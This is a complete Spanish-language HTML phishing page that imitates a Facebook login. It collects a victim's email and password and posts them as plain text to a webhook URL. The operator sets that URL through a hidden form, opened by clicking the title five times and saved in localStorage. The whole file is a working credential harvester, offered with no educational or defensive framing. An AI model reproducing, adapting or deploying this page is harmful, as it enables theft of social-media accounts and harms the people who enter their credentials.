<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inicio de Sesión</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            text-align: center;
            padding: 50px;
        }
        h1 {
            cursor: pointer;
            color: #1877f2;
            font-size: 50px;
        }
        .form-container {
            display: block;
            margin-top: 20px;
            text-align: center;
        }
        input[type="text"], input[type="password"], input[type="email"] {
            padding: 10px;
            font-size: 16px;
            width: 300px;
            margin-bottom: 10px;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        button {
            padding: 10px 20px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #155db6;
        }
    </style>
</head>
<body>

    <h1 id="facebook-title">Facebook</h1>

    <!-- Formulario de credenciales -->
    <div class="form-container">
        <h2>Ingresa tus credenciales</h2>
        <input type="email" id="email" placeholder="Ingresa tu correo" required>
        <br><br>
        <input type="password" id="password" placeholder="Ingresa tu contraseña" required>
        <br><br>
        <button onclick="sendData()">Enviar Datos</button>
    </div>

    <!-- Formulario para ingresar el webhook, inicialmente oculto -->
    <div class="form-container" id="webhook-form" style="display: none;">
        <h2>Ingresa la URL del Webhook</h2>
        <input type="text" id="webhook-url" placeholder="URL del Webhook" required>
        <br><br>
        <button onclick="saveWebhook()">Guardar Webhook</button>
    </div>

    <script>
        let clickCount = 0;

        // Verificar si hay un webhook guardado en localStorage
        window.onload = function() {
            const savedWebhook = localStorage.getItem('webhook');
            if (savedWebhook) {
                document.getElementById('webhook-url').value = savedWebhook;
            }
        }

        // Función para manejar los clics en el título
        document.getElementById('facebook-title').addEventListener('click', function() {
            clickCount++;
            if (clickCount >= 5) {
                document.getElementById('webhook-form').style.display = 'block';
            }
        });

        // Función para guardar el webhook en localStorage
        function saveWebhook() {
            const webhookUrl = document.getElementById('webhook-url').value;
            if (webhookUrl) {
                localStorage.setItem('webhook', webhookUrl);
                alert("Webhook guardado correctamente.");
                document.getElementById('webhook-form').style.display = 'none'; // Ocultar el formulario del webhook
            } else {
                alert("Por favor, ingresa una URL válida.");
            }
        }

        // Función para enviar los datos al webhook
        function sendData() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const webhookUrl = localStorage.getItem('webhook'); // Obtener el webhook guardado

            if (!email || !password || !webhookUrl) {
                alert("Por favor, completa todos los campos.");
                return;
            }

            // Preparar los datos a enviar
            const data = {
                content: `Intento de inicio de sesión:\nEmail: ${email}\nContraseña: ${password}`
            };

            // Usar fetch para enviar los datos al webhook
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                alert("Datos enviados correctamente.");
                console.log(data);
            })
            .catch(error => {
                alert("Hubo un error al enviar los datos al webhook.");
                console.error(error);
            });
        }
    </script>

</body>
</html>
